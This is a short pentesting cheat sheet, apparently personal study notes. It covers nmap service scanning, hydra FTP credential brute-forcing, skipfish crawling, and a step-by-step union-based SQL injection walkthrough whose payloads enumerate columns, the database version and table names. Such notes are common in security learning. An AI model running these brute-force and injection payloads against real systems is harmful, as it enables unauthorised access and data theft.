## nmap commands
- `nmap -sV -p <list of ports> <IP address>`: Lists all the services running on the ports

## hydra commands
- `hydra -C <username & password file> ftp://<IP address>`: Attempts to log in to the FTP service at the specified IP address using a list of username and password combinations provided in the file.

## skipfish commands
- `skipfish -o <Output file> <website url>`: Crawls the website to find all available directories
- `skipfish -o <Output file> -A <user>:<password> <website url>`: Crawls while logged in with HTML credentials

## SQL Injection
### SQL Injection in search fields
Lets say the search page is handled by a file named sql.php and the parameter is search.
Sql.php?search=pentesting  
First thing we try is to search with single quote '  
`Sql.php?search='`  
If it retruns an error, then we know its vulnerable.
Our next step is to determine the number of columns starting from running a normal query
on the search box to get an idea.  
Finding the number of columns:  
`Sql.php?search=test' order by 1-- -` [In the search field: `test' ORDER BY 1-- -`]  
or  
`Sql.php?search=test' order by 1--` [In the search field: `test' ORDER BY 1--`]  
We keep incrementing the number until we hit an error which indicates the number of columns.

Then we search for something similar to that below:  
`Sql.php?search=pentesting' union select 1,1,1,1,1,1#` [In the search field: `pentesting' UNION SELECT 1,1,1,1,1,1-- -`]  
or  
`Sql.php?search=pentesting' AND 1 = 0 UNION ALL SELECT 1,1,1,1,1,1 FROM information_schema.tables WHERE 1=0 OR 1=1-- `  
We continue adding '1's untill we don't receive any error from the page.
Only then we know how many columns by counting the '1's.

Then we try to find the database name, table names, columns of target table  
`Sql.php?search=pentesting' union select 1,database(),@@version,1,1,1#`  
or  
`Sql.php?search=pentesting' and 1 = 0 union all select 1,database(),@@version,1,1,1 from information_schema.tables where 1=0 OR 1=1-- -`  

`Sql.php?search=pentesting' union select 1,table_name,1,1,1,1 from information_schema.tables#` [In the search field: `pentesting' UNION SELECT 1,table_name,1,1 FROM information_schema.tables-- -`]
